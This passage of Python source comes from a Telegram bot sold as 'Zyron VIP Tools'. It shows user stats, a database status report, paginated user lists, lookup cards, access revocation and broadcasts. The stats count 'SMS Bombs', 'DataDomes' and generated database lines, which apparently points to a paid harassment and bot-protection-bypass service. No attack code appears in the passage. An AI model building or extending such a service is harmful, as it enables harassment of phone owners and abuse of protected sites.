        access_emoji = "🌟"
    elif access_info and access_info > datetime.datetime.now().timestamp():
        remaining_time = access_info - datetime.datetime.now().timestamp()
        days = int(remaining_time // 86400)
        hours = int((remaining_time % 86400) // 3600)
        access_status = f"*✅ Active Premium*"
        expires_text = f"🗓️ {days}d {hours}h remaining"
        access_emoji = "✅"
    else:
        access_status = "*❌ No Access*"
        expires_text = "🚫 Expired or inactive"
        access_emoji = "❌"
    
    db_stats, total_lines = get_database_stats()
    
    now = datetime.datetime.now().strftime("%b %d, %Y • %I:%M %p")
    reset_daily_stats_if_needed(user_id)
    quota      = USER_QUOTAS.get(user_id, GENERATE_DAILY_LIMIT)
    used_today = user_stats.get("generate_today", 0)
    streak     = user_stats.get("checkin_streak", 0)

    stats_text = (
        f"📊  *MY STATS*\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"👤  *{escape_md(user.first_name)}*  ›  `{user_id}`\n"
        f"🏷️  Role  ›  `{USER_ROLES.get(user_id, 'user').capitalize()}`\n"
        f"🔗  @{user.username or '—'}\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"🔐  Status  ›  {access_status}\n"
        f"⏳  Expiry  ›  {expires_text}\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"📈  *Tool Usage*\n"
        f"📂  DB Generated    ›  `{user_stats.get('generations', 0):,}`  (today: {used_today}/{quota})\n"
        f"💣  SMS Bombs       ›  `{user_stats.get('sms_bomb_count', 0):,}`\n"
        f"🚀  Boosts          ›  `{user_stats.get('boost_count', 0):,}`\n"
        f"🔐  Encryptions     ›  `{user_stats.get('encrypt_count', 0):,}`\n"
        f"🛡️  DataDomes       ›  `{user_stats.get('datadome_count', 0):,}`\n"
        f"🔥  Check-in streak ›  `{streak} days`\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"🗄️  DB lines  ›  `{total_lines:,}`  (500/gen)\n"
        f"📅  Joined    ›  `{user_stats.get('joined', '—')[:10]}`\n"
        f"🕐  Last seen ›  `{user_stats.get('last_active', 'Never')[:10] if user_stats.get('last_active') else 'Never'}`\n"
        f"⚡  Uptime    ›  `{get_uptime()}`"
    )

    if update.callback_query:
        await safe_edit(update.callback_query.message, stats_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ʀᴇғʀᴇsʜ", callback_data="show_stats"), InlineKeyboardButton("⬅️ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]), parse_mode="Markdown")
    else:
        await update.effective_message.reply_text(stats_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ʀᴇғʀᴇsʜ", callback_data="show_stats"), InlineKeyboardButton("⬅️ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]), parse_mode="Markdown")

async def database_status(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("database_status called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return
        
    db_stats, total_lines = get_database_stats()
    
    status_text = "💾 *ᴇɴʜᴀɴᴄᴇ ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛᴜs ʀᴇᴘᴏʀᴛ* 📊\n\n"
    
    for db_name, count in db_stats.items():
        status = "🟢 ʜᴇᴀʟᴛʜʏ" if count > 1000 else "🟡 ᴍᴏᴅᴇʀᴀᴛᴇ" if count > 100 else "🔴 ʟᴏᴡ" if count > 0 else "⚫ ᴇᴍᴘᴛʏ"
        status_text += f"• {status}: *{db_name}* ({count:,} lines)\n"
        
        file_path = DATABASE_FILES[db_name]
        try:
            file_size = os.path.getsize(file_path) if os.path.exists(file_path) else 0
            size_mb = file_size / (1024 * 1024)
            status_text += f"  - *Lines*: *{count:,}*\n"
            status_text += f"  - *Size*: *{size_mb:.2f} MB*\n\n"
        except Exception as e:
            status_text += f"⚠️ *{db_name}* - Error reading file info: {e}\n\n"

    status_text += f"✨ *Overall Summary:*\n"
    status_text += f"• Total Lines Across All Databases: *{total_lines:,}*\n"
    status_text += f"• Databases with Content: *{len([x for x in db_stats.values() if x > 0])}/{len(DATABASE_FILES)}*\n"
    status_text += f"• Estimated Total Generations Possible (at 500 lines/gen): *{total_lines // 500:,}*\n"
    
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, status_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(status_text, reply_markup=reply_markup, parse_mode="Markdown")

# ========== USER MANAGEMENT FUNCTIONS ==========
def _escape_md(text: str) -> str:
    """Escape special Markdown v1 characters to prevent parse errors."""
    # In Markdown v1 only * _ ` [ need escaping
    for ch in ['_', '*', '`', '[']:
        text = text.replace(ch, f'\\{ch}')
    return text

async def _fetch_username(bot, uid: int) -> str:
    """Return '@username' or 'FirstName' or '' — never raises. 3s timeout."""
    try:
        chat = await asyncio.wait_for(bot.get_chat(uid), timeout=3.0)
        if chat.username:
            return f"@{chat.username}"
        if chat.first_name:
            return chat.first_name[:24]
    except asyncio.TimeoutError:
        logging.debug(f"get_chat({uid}) timed out")
    except Exception as e:
        logging.debug(f"get_chat({uid}) failed: {e}")
    return ""

USERS_PER_PAGE = 8  # compact cards — more fit per page

# Status badge mapping
_STATUS_BADGE = {
    "owner":          "👑 OWNER",
    "reseller":       "🌟 RESELLER",
    "lifetime":       "♾️ LIFETIME",
    "active":         "✅ ACTIVE",
    "expired":        "❌ EXPIRED",
    "no_access":      "🚫 NO ACCESS",
}

def _user_status(uid, access_info, now_ts):
    """Return (badge, expiry_str, is_active) for a user."""
    role = USER_ROLES.get(uid, "user")
    if role == "owner":
        return _STATUS_BADGE["owner"], "permanent", True
    if role == "reseller":
        return _STATUS_BADGE["reseller"], "permanent", True
    if uid not in USER_ACCESS:
        return _STATUS_BADGE["no_access"], "—", False
    if access_info is None:
        return _STATUS_BADGE["lifetime"], "lifetime", True
    if access_info and access_info > now_ts:
        remaining = access_info - now_ts
        days  = int(remaining // 86400)
        hours = int((remaining % 86400) // 3600)
        expire_dt = datetime.datetime.fromtimestamp(access_info).strftime("%b %d")
        time_str = f"{days}d {hours}h" if days > 0 else f"{hours}h"
        return _STATUS_BADGE["active"], f"{time_str} left · expires {expire_dt}", True
    expire_dt = datetime.datetime.fromtimestamp(access_info).strftime("%b %d, %Y") if access_info else "?"
    return _STATUS_BADGE["expired"], f"expired {expire_dt}", False


def _build_compact_card(uid, access_info, now_ts, index: int) -> tuple:
    """
    Build a compact single-line-style card for the list view.
    Returns (card_text, is_active).
    """
    stats    = USER_STATS.get(uid, {})
    badge, expiry_str, is_active = _user_status(uid, access_info, now_ts)

    username = stats.get("username", "")
    if username.startswith("@"):
        uname_str = username
    elif username and " " not in username and len(username) <= 32:
        uname_str = f"@{username}"
    elif username:
        uname_str = username
    else:
        uname_str = "no username"

    gens      = stats.get("generations", 0)
    last_raw  = stats.get("last_active")
    if last_raw:
        try:    last_seen = datetime.datetime.fromisoformat(last_raw).strftime("%b %d")
        except: last_seen = str(last_raw)[:10]
    else:
        last_seen = "never"

    joined_raw = stats.get("joined")
    if joined_raw:
        try:    joined_str = datetime.datetime.fromisoformat(joined_raw).strftime("%b %d, %Y")
        except: joined_str = str(joined_raw)[:10]
    else:
        joined_str = "—"

    card = (
        f"┌─ #{index} {badge}\n"
        f"├ 👤 `{uid}` · {uname_str}\n"
        f"├ ⏳ {expiry_str}\n"
        f"├ ⚙️ {gens:,} gen · 🕐 {last_seen}\n"
        f"└ 📅 joined {joined_str}"
    )
    return card, is_active


def _build_all_cards(now_ts):
    """Return list of (uid, card_str, is_active) sorted: active first, then expired."""
    entries = []
    for uid, access_info in USER_ACCESS.items():
        badge, expiry_str, is_active = _user_status(uid, access_info, now_ts)
        entries.append((uid, access_info, is_active))

    # Sort: owners first, then resellers, then active, then expired
    def sort_key(e):
        uid, _, is_active = e
        role = USER_ROLES.get(uid, "user")
        if role == "owner":    return 0
        if role == "reseller": return 1
        if is_active:          return 2
        return 3

    entries.sort(key=sort_key)

    result = []
    for i, (uid, access_info, is_active) in enumerate(entries, 1):
        card, _ = _build_compact_card(uid, access_info, now_ts, i)
        result.append((uid, card, is_active))

    active_count = sum(1 for _, _, a in result if a)
    return result, active_count


def _user_list_message(page: int, entries: list, active_count: int, total: int, page_entries: list = None):
    """Build the text + InlineKeyboardMarkup for the user list page."""
    total_pages = max(1, (total + USERS_PER_PAGE - 1) // USERS_PER_PAGE)
    page = max(0, min(page, total_pages - 1))

    if page_entries is None:
        start_i = page * USERS_PER_PAGE
        page_entries = entries[start_i: start_i + USERS_PER_PAGE]

    expired_count = total - active_count
    SEP = "━━━━━━━━━━━━━━━━━━━━"

    header = (
        f"👥 *USER LIST* — Page {page+1}/{total_pages}\n"
        f"{SEP}\n"
        f"✅ Active: `{active_count}` · ❌ Expired: `{expired_count}` · 📊 Total: `{total}`\n"
        f"{SEP}\n\n"
    )

    cards = []
    for uid, card, is_active in page_entries:
        cards.append(card)
    body = "\n\n".join(cards)

    footer = f"\n\n{SEP}\n💡 Tap an action button below a user, or use `/lookup <id>`"
    text = header + body + footer

    # Navigation row
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️", callback_data=f"userlist_page_{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="userlist_noop"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("➡️", callback_data=f"userlist_page_{page+1}"))

    # Quick-action buttons for each user on the page (pairs)
    action_rows = []
    for uid, card, is_active in page_entries:
        uname = USER_STATS.get(uid, {}).get("username", "") or str(uid)
        short = uname[:12] if len(uname) > 12 else uname
        row = [
            InlineKeyboardButton(f"🔍 {short}", callback_data=f"ul_view_{uid}"),
            InlineKeyboardButton(f"✅ +30d",    callback_data=f"quick_approve_{uid}_30"),
            InlineKeyboardButton(f"🔴 Revoke",  callback_data=f"quick_revoke_{uid}"),
        ]
        action_rows.append(row)

    keyboard = []
    if nav:
        keyboard.append(nav)
    keyboard.extend(action_rows)
    keyboard.append([
        InlineKeyboardButton("🔄 Refresh",              callback_data=f"userlist_page_{page}"),
        InlineKeyboardButton("⬅️ Admin Panel",           callback_data="show_admin_panel"),
    ])
    return text, InlineKeyboardMarkup(keyboard)


async def _fetch_usernames_for_page(bot, uids: list):
    """Fetch & cache usernames for a list of uids in parallel. Fast — uses gather."""
    missing = [uid for uid in uids if not USER_STATS.get(uid, {}).get("username")]
    if not missing:
        return
    results = await asyncio.gather(*[_fetch_username(bot, uid) for uid in missing], return_exceptions=True)
    for uid, result in zip(missing, results):
        if isinstance(result, str) and result:
            if uid not in USER_STATS:
                USER_STATS[uid] = {}
            USER_STATS[uid]["username"] = result


async def user_list(update: Update, context: CallbackContext, page: int = 0):
    """Paginated user list — 5 per page, each with full card + action commands."""
    current_message: Message = (
        update.message if update.message
        else update.callback_query.message if update.callback_query
        else None
    )
    if not current_message:
        logging.warning("user_list called with no effective message.")
        return

    caller_id = update.effective_user.id
    if not is_at_least_role(caller_id, "owner"):
        msg = "❌  *Access Denied*  ·  Owner only."
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, msg, parse_mode="Markdown")
        else:
            await current_message.reply_text(msg, parse_mode="Markdown")
        return

    if not USER_ACCESS:
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]])
        txt = "📋 *ɴᴏ ᴜsᴇʀs ғᴏᴜɴᴅ.*"
        if update.callback_query:
            await safe_edit(current_message, txt, reply_markup=kb, parse_mode="Markdown")
        else:
            await current_message.reply_text(txt, reply_markup=kb, parse_mode="Markdown")
        return

    # Build page data first (instant, no API calls)
    now_ts = datetime.datetime.now().timestamp()
    entries, active_count = _build_all_cards(now_ts)
    total = len(entries)
    total_pages = max(1, (total + USERS_PER_PAGE - 1) // USERS_PER_PAGE)
    page = max(0, min(page, total_pages - 1))

    # Only fetch usernames for the current page (parallel, fast)
    start_i = page * USERS_PER_PAGE
    page_uids = [uid for uid, _, _ in entries[start_i: start_i + USERS_PER_PAGE]]
    await _fetch_usernames_for_page(context.bot, page_uids)

    # Rebuild only current page entries with fresh usernames
    page_entries = []
    for uid, card, is_active in entries[start_i: start_i + USERS_PER_PAGE]:
        access_info = USER_ACCESS.get(uid)
        fresh_card, fresh_active = _build_compact_card(uid, access_info, now_ts, start_i + len(page_entries) + 1)
        page_entries.append((uid, fresh_card, fresh_active))

    text, reply_markup = _user_list_message(page, entries, active_count, total, page_entries)

    try:
        if update.callback_query:
            await safe_edit(current_message, text, reply_markup=reply_markup, parse_mode="Markdown")
        else:
            await current_message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"user_list page {page} error: {e}")


# ========== LOOKUP COMMAND ==========
async def _refresh_lookup_card(query, context: CallbackContext, target_id: int):
    """Rebuild and edit the lookup card in-place after a quick action."""
    now_ts = datetime.datetime.now().timestamp()
    tg_username = ""
    try:
        chat = await asyncio.wait_for(context.bot.get_chat(target_id), timeout=3.0)
        tg_username = f"@{chat.username}" if chat.username else (chat.first_name or "")
    except Exception:
        pass

    display_name = tg_username or USER_STATS.get(target_id, {}).get("username", "") or "(unknown)"
    if display_name and not display_name.startswith("@") and " " not in display_name and len(display_name) <= 32 and display_name != "(unknown)":
        display_name = f"@{display_name}"

    role = USER_ROLES.get(target_id, "user")
    access_info = USER_ACCESS.get(target_id)
    badge, expiry_str, _ = _user_status(target_id, access_info, now_ts)
    stats = USER_STATS.get(target_id, {})
    gens = stats.get("generations", 0)
    keys_used = stats.get("keys_used", 0)
    referrals = stats.get("referrals", 0)

    joined_raw = stats.get("joined")
    joined_str = "unknown"
    if joined_raw:
        try: joined_str = datetime.datetime.fromisoformat(joined_raw).strftime("%Y-%m-%d")
        except: joined_str = str(joined_raw)[:10]

    last_raw = stats.get("last_active")
    last_seen = "never"
    if last_raw:
        try: last_seen = datetime.datetime.fromisoformat(last_raw).strftime("%Y-%m-%dT%H:%M")
        except: last_seen = str(last_raw)[:16]

    card = (
        f"👤 *User Detail — /lookup*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID       ┊ `{target_id}`\n"
        f"💬 Username ┊ {display_name}\n"
        f"🏷️ Role     ┊ `{role}`\n"
        f"🔰 Status   ┊ {badge}\n"
        f"⏳ Expiry   ┊ `{expiry_str}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ Generated ┊ `{gens:,} lines`\n"
        f"🔑 Keys Used ┊ `{keys_used}`\n"
        f"🔗 Referrals ┊ `{referrals} pts`\n"
        f"📅 Joined    ┊ `{joined_str}`\n"
        f"🕐 Last Seen ┊ `{last_seen}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"`/approve {target_id} 30d`\n"
        f"`/revoke {target_id}`\n"
        f"`/ban {target_id} reason`"
    )
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ +7d",  callback_data=f"quick_approve_{target_id}_7"),
            InlineKeyboardButton("✅ +30d", callback_data=f"quick_approve_{target_id}_30"),
            InlineKeyboardButton("✅ +90d", callback_data=f"quick_approve_{target_id}_90"),
        ],
        [
            InlineKeyboardButton("🔴 Revoke", callback_data=f"quick_revoke_{target_id}"),
            InlineKeyboardButton("🚫 Ban",     callback_data=f"ul_ban_{target_id}"),
        ],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")],
    ])
    await safe_edit(query.message, card, reply_markup=keyboard, parse_mode="Markdown")


async def lookup_command(update: Update, context: CallbackContext):
    """
    /lookup <user_id>
    Full profile card for a single user, owner-only.
    """
    caller_id = update.effective_user.id
    if not is_at_least_role(caller_id, "owner"):
        await update.effective_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return

    # Clear userlist context so quick-action buttons return to Admin Panel
    context.user_data.pop("action_source", None)

    if not context.args:
        await update.effective_message.reply_text(
            "ᴜsᴀɢᴇ: `/lookup <user_id>`",
            parse_mode="Markdown"
        )
        return

    try:
        target_id = int(context.args[0].strip())
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID — must be a number.", parse_mode="Markdown")
        return

    now_ts = datetime.datetime.now().timestamp()
    now_dt = datetime.datetime.now()

    # ── Telegram info ──────────────────────────────────────────
    tg_username = ""
    tg_first = ""
    try:
        chat = await context.bot.get_chat(target_id)
        tg_username = f"@{chat.username}" if chat.username else ""
        tg_first = chat.first_name or ""
    except Exception as e:
        logging.debug(f"lookup get_chat({target_id}): {e}")

    display_name = tg_username or tg_first or "(unknown)"

    # ── Access / expiry ────────────────────────────────────────
    access_info = USER_ACCESS.get(target_id)
    role = USER_ROLES.get(target_id, "user")

    if role == "owner":
        status_str = "OWNER (permanent)"
        expiry_str = "never"
    elif role == "reseller":
        status_str = "RESELLER (permanent)"
        expiry_str = "never"
    elif target_id not in USER_ACCESS:
        status_str = "NO ACCESS"
        expiry_str = "—"
    elif access_info is None:
        status_str = "LIFETIME ACTIVE"
        expiry_str = "lifetime"
    elif access_info > now_ts:
        remaining = access_info - now_ts
        days = int(remaining // 86400)
        hours = int((remaining % 86400) // 3600)
        expire_dt = datetime.datetime.fromtimestamp(access_info).strftime("%Y-%m-%d")
        status_str = "PREMIUM ACTIVE"
        expiry_str = f"{days}d {hours}h left ({expire_dt})"
    else:
        expire_dt = datetime.datetime.fromtimestamp(access_info).strftime("%Y-%m-%d")
        status_str = "EXPIRED"
        expiry_str = f"expired {expire_dt}"

    # ── Stats ──────────────────────────────────────────────────
    stats = USER_STATS.get(target_id, {})
    gens = stats.get("generations", 0)
    last_active_raw = stats.get("last_active")
    if last_active_raw:
        try:
            last_dt = datetime.datetime.fromisoformat(last_active_raw)
            last_seen = last_dt.strftime("%Y-%m-%dT%H:%M")
        except Exception:
            last_seen = str(last_active_raw)[:16]
    else:
        last_seen = "never"

    # Keys used by this user (redeeming a key puts them in USER_ACCESS)
    keys_used = sum(
        1 for k, v in ACCESS_KEYS.items()
        if isinstance(v, dict) and v.get("redeemed_by") == target_id
    ) + sum(
        1 for k in USED_KEYS
        if True  # we don't store who used each key; count from USER_STATS if available
    )
    # Simpler reliable count: just report from stats if stored, else 0
    keys_used = stats.get("keys_used", 0)

    joined_raw = stats.get("joined")
    if joined_raw:
        try:
            joined_dt = datetime.datetime.fromisoformat(joined_raw)
            joined_str = joined_dt.strftime("%Y-%m-%d")
        except Exception:
            joined_str = str(joined_raw)[:10]
    else:
        joined_str = "unknown"

    referrals = stats.get("referrals", 0)

    # ── Patch live username into stats so the card shows it ──────
    if target_id in USER_STATS and display_name != "(unknown)":
        USER_STATS[target_id]["username"] = display_name.lstrip("@")

    # ── Build card using new detail formatter ─────────────────────
    access_info_val = USER_ACCESS.get(target_id)
    now_ts_val = datetime.datetime.now().timestamp()
    badge, expiry_str, is_active = _user_status(target_id, access_info_val, now_ts_val)
    stats_val = USER_STATS.get(target_id, {})

    card = (
        f"👤 *User Detail — /lookup*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID       ┊ `{target_id}`\n"
        f"💬 Username ┊ {display_name}\n"
        f"🏷️ Role     ┊ `{role}`\n"
        f"🔰 Status   ┊ {badge}\n"
        f"⏳ Expiry   ┊ `{expiry_str}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ Generated ┊ `{gens:,} lines`\n"
        f"🔑 Keys Used ┊ `{keys_used}`\n"
        f"🔗 Referrals ┊ `{referrals} pts`\n"
        f"📅 Joined    ┊ `{joined_str}`\n"
        f"🕐 Last Seen ┊ `{last_seen}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"`/approve {target_id} 30d`\n"
        f"`/revoke {target_id}`\n"
        f"`/ban {target_id} reason`"
    )

    keyboard = [
        [
            InlineKeyboardButton("✅ +7d",  callback_data=f"quick_approve_{target_id}_7"),
            InlineKeyboardButton("✅ +30d", callback_data=f"quick_approve_{target_id}_30"),
            InlineKeyboardButton("✅ +90d", callback_data=f"quick_approve_{target_id}_90"),
        ],
        [
            InlineKeyboardButton("🔴 Revoke", callback_data=f"quick_revoke_{target_id}"),
            InlineKeyboardButton("🚫 Ban",     callback_data=f"ul_ban_{target_id}"),
        ],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.effective_message.reply_text(
        card,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def revoke_access(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("revoke_access called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return
    
    # Clear all conflicting states before entering revoke flow
    AWAITING_KEY_INPUT.discard(user_id)
    AWAITING_KEY_DURATION.discard(user_id)
    AWAITING_KEY_TIER.discard(user_id)
    AWAITING_KEY_USES.discard(user_id)
    AWAITING_KEY_COUNT.discard(user_id)
    AWAITING_ANNOUNCEMENT.discard(user_id)
    AWAITING_DELETE_KEY.discard(user_id)
    AWAITING_FEEDBACK.discard(user_id)
    AWAITING_REVOKE_MULTI_KEYS.discard(user_id)
    AWAITING_REVOKE_USER.add(user_id)
    message_text = (
        "╔══════════════════════════╗\n"
        "║  🔴  ʀᴇᴠᴏᴋᴇ ᴜsᴇʀ ᴀᴄᴄᴇss  ║\n"
        "╚══════════════════════════╝\n\n"
        "sᴇɴᴅ ᴛʜᴇ *ᴜsᴇʀ ɪᴅ* ᴛᴏ ʀᴇᴠᴏᴋᴇ:\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 ᴇxᴀᴍᴘʟᴇ: `123456789`\n"
        "⚠️ ᴄᴀɴɴᴏᴛ ʀᴇᴠᴏᴋᴇ ᴀᴅᴍɪɴ ᴀᴄᴄᴇss\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_revoke_user(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_REVOKE_USER:
        return
    
    try:
        user_id_to_revoke = int(update.message.text.strip())
        
        if user_id_to_revoke == ADMIN_ID:
            await update.effective_message.reply_text(
                "❌ *ᴏᴘᴇʀᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ!* ʏᴏᴜ ᴄᴀɴɴᴏᴛ ʀᴇᴠᴏᴋᴇ ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀ ᴀᴄᴄᴇss.",
                parse_mode="Markdown"
            )
        elif user_id_to_revoke in USER_ACCESS:
            del USER_ACCESS[user_id_to_revoke]
            USER_ROLES[user_id_to_revoke] = "user"
            schedule_save()
            await update.effective_message.reply_text(
                f"✅ *sᴜᴄᴄᴇss!* ᴀᴄᴄᴇss ғᴏʀ ᴜsᴇʀ `{user_id_to_revoke}` ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ.",
                parse_mode="Markdown"
            )
            logging.info(f"Admin revoked access for user {user_id_to_revoke}")
            await log_to_channel(
                context.bot,
                f"🔴 *Access Revoked*\n👤 `{user_id_to_revoke}`\nBy admin `{user_id}`"
            )
        else:
            await update.effective_message.reply_text(
                f"❌ *ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!* ᴜsᴇʀ `{user_id_to_revoke}` ɪs ɴᴏᴛ ɪɴ ᴛʜᴇ ᴀᴄᴄᴇss ʟɪsᴛ.",
                parse_mode="Markdown"
            )
    except ValueError:
        await update.effective_message.reply_text(
            "❌ *ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ!* ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ (ɴᴜᴍʙᴇʀs ᴏɴʟʏ).",
            parse_mode="Markdown"
        )
    finally:
        AWAITING_REVOKE_USER.discard(user_id)
    await admin_panel(update, context)

async def send_announcement(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("send_announcement called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return
    
    AWAITING_ANNOUNCEMENT.add(user_id)
    now_ts = time.time()
    all_count     = len(USER_ACCESS)
    active_count  = sum(1 for exp in USER_ACCESS.values() if exp is None or exp > now_ts)
    expired_count = all_count - active_count
    vip_count     = sum(1 for uid in USER_ACCESS if USER_ROLES.get(uid) in ("vip", "reseller", "owner"))

    # ── Targeting step (#4) ─────────────────────────────────────
    targeting_text = (
        f"📣 *ʙʀᴏᴀᴅᴄᴀsᴛ — sᴇʟᴇᴄᴛ ᴛᴀʀɢᴇᴛ*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 ᴀʟʟ: `{all_count}` · ✅ ᴀᴄᴛɪᴠᴇ: `{active_count}` · "
        f"❌ ᴇxᴘɪʀᴇᴅ: `{expired_count}` · 💎 ᴠɪᴘ: `{vip_count}`"
    )
    keyboard = [
        [InlineKeyboardButton(f"👥 ᴀʟʟ ᴜsᴇʀs ({all_count})",     callback_data="bcast_target_all")],
        [InlineKeyboardButton(f"✅ ᴀᴄᴛɪᴠᴇ ᴏɴʟʏ ({active_count})", callback_data="bcast_target_active")],
        [InlineKeyboardButton(f"❌ ᴇxᴘɪʀᴇᴅ ᴏɴʟʏ ({expired_count})", callback_data="bcast_target_expired")],
        [InlineKeyboardButton(f"💎 ᴠɪᴘ ᴏɴʟʏ ({vip_count})",       callback_data="bcast_target_vip")],
        [InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ",                        callback_data="cancel_action")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, targeting_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(targeting_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_announcement(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_ANNOUNCEMENT:
        return

    announcement = update.message.text
    sent_count = 0
    failed_count = 0

    progress_msg = await update.effective_message.reply_text("📡 *ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ...* ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ⏳", parse_mode="Markdown")

    # ── Filter by target (#4) ────────────────────────────────────
    now_ts = time.time()
    target = context.user_data.pop("bcast_target", "all")
    if target == "active":
        recipients = [uid for uid, exp in USER_ACCESS.items() if exp is None or exp > now_ts]
    elif target == "expired":
        recipients = [uid for uid, exp in USER_ACCESS.items() if exp and exp <= now_ts]
    elif target == "vip":
        recipients = [uid for uid in USER_ACCESS if USER_ROLES.get(uid) in ("vip", "reseller", "owner")]
    else:
        recipients = list(USER_ACCESS.keys())

    for user_id_to_send in recipients:
        try:
            await context.bot.send_message(
                chat_id=int(user_id_to_send),
                text=f"📢 *ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs*\n━━━━━━━━━━━━━━━━━━━━\n\n{announcement}\n\n━━━━━━━━━━━━━━━━━━━━\n📞 @ZyronDevv ",
                parse_mode="Markdown"
            )
            sent_count += 1
            await asyncio.sleep(0.1)
        except Exception as e:
            failed_count += 1
            logging.debug(f"Failed to send announcement to {user_id_to_send}: {e}")

    await safe_edit(progress_msg,
        f"✅ *ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇ*\n\n"
        f"• sᴇɴᴛ: *{sent_count}* ᴜsᴇʀs\n"
        f"• ғᴀɪʟᴇᴅ: *{failed_count}*\n"
        f"• ᴛᴀʀɢᴇᴛ: *{target}*",
        parse_mode="Markdown"
    )

    AWAITING_ANNOUNCEMENT.discard(user_id)
    await admin_panel(update, context)

# ========== HELP FUNCTION ==========
